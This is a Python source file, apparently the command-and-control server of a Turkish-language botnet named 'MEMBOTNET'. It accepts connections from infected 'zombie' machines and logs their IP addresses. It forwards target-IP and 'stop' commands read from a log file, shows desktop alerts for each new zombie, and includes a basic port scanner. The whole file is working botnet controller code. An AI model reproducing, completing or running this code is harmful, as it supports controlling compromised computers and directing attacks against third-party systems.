import socket
import json
import sys
import os
import tkinter
from tkinter import Tk
import colorama
import time
try:
    import win10toast
except ImportError:
    print('"win10toast" Bulunamadı! lütfen terminala "pip install win10toast" yaz!')
    sys.exit()
from win10toast import ToastNotifier
from colorama import Fore, init
file = sys.argv[0]
current_path = os.path.dirname(file)
current_path = current_path.replace("/server", "")
print(current_path)
toast = ToastNotifier()
init()
if len(sys.argv) < 3:
    sys.exit()

try:
    if os.path.exists(current_path+'/zombies/zm.log'):
        pass
    else:
        with open(current_path+'/zombies/zm.log', 'w') as g:
            g.close()
except:
    pass
scan = sys.argv[3]

def menu(host=scan):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(2)
    closed = []
    opened = []
    def portscanner(port):
        if sock.connect_ex((host,port)):
            closed.append(port)
        else:
            opened.append(port)
    for port in range (1, 1000):
        portscanner(port);
    sys.exit()


local = sys.argv[1]
listen_port = int(sys.argv[2])
if scan == "":
    scan == "1"
try:
    if os.path.exists(current_path+'/server/cmd.log'):
        os.remove(current_path+'/server/cmd.log')
    else:
        pass
except:
    pass
def listen_loop():
    while True:
        def cmd_send(data):
            jsondata = json.dumps(data)
            target.send(jsondata.encode())
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((local, listen_port))
        server.listen(5)
        target, ip = server.accept()
        host = socket.gethostname()
        addr = socket.gethostbyname(host)
        all_addr = socket.gethostbyname_ex(host)
        try:
            with open(current_path+'/server/cmd.log', 'r') as f:
                log = f.read()
            if "ip" in log:
                s = log.split()
                cmd_send(f"ip {s[1]} {s[2]}")
        except:
            pass
        try:
            with open(current_path+'/server/cmd.log', 'r') as f:
                log = f.read()
            if "stop" in log:
                cmd_send("stop")
        except:
            pass
        try:
            with open(current_path+'/zombies/zm.log', 'a') as f:
                f.write(str(ip[0])+'\n')
        except:
            pass
        addrs = 0
        for i in all_addr:
            addrs += 1
        toast.show_toast(f"MEMBOTNET", f"Sunucu: {local}, Yeni zombi bağlandı!, hedef IP adres: {str(ip[0])}, hedef sistem ad: {host}, hedef tam adresler: {str(addrs)}",duration=6,icon_path=current_path+'/icons/ninja_icon.ico')

if listen_port == 0 and local == "0":
    menu()


listen_loop()